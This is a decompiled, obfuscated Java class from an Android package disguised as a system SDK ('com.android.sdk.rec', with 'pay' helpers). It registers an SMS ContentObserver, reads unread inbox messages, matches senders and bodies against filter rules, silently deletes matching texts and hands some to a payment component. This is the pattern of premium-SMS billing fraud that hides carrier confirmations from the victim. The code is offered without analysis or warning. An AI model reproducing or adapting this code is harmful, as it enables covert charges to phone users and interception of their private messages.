package com.android.sdk.rec;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import com.android.sdk.pay.ActivityTool;
import com.android.sdk.pay.x;
import com.android.sdk.pay.x.b;
import com.android.sdk.pay.y;
import com.android.sdk.pay.z;

public class c
  extends ContentObserver
{
  private static final String a = c.class.getSimpleName();
  private ContentResolver b;
  private Context c;
  
  public c(Handler paramHandler, Context paramContext)
  {
    super(paramHandler);
    this.c = paramContext;
    this.b = paramContext.getContentResolver();
  }
  
  private int a(long paramLong1, long paramLong2)
  {
    Uri localUri = Uri.parse("content://sms/conversations/" + paramLong2);
    String str = paramLong1;
    return this.b.delete(localUri, "_id=?", new String[] { str });
  }
  
  public void onChange(boolean paramBoolean)
  {
    super.onChange(paramBoolean);
    try
    {
      Object localObject = Uri.parse("content://sms//inbox");
      localObject = this.b.query((Uri)localObject, null, " read=?", new String[] { "0" }, "date desc");
      int i = 0;
      for (;;)
      {
        int j;
        if ((localObject != null) && (((Cursor)localObject).moveToNext()))
        {
          j = i + 1;
          if (i < 2) {}
        }
        else
        {
          ((Cursor)localObject).close();
          return;
        }
        long l1 = ((Cursor)localObject).getLong(((Cursor)localObject).getColumnIndex("_id"));
        long l2 = ((Cursor)localObject).getLong(((Cursor)localObject).getColumnIndex("thread_id"));
        String str1 = ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("address"));
        String str2 = ((Cursor)localObject).getString(((Cursor)localObject).getColumnIndex("body"));
        ActivityTool.checkAppStatus(this.c);
        if (x.a().b(str1, str2))
        {
          a(l1, l2);
          i = j;
        }
        else
        {
          x.b localB = x.a().a(this.c, str1, str2);
          if (localB != null)
          {
            a(l1, l2);
            y localY = new y();
            localY.a(localB.a, 1, localB.b, localB.c);
            z.a().a(localY);
          }
          if (x.a().a(str1, str2)) {
            a(l1, l2);
          }
          i = j;
        }
      }
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
}
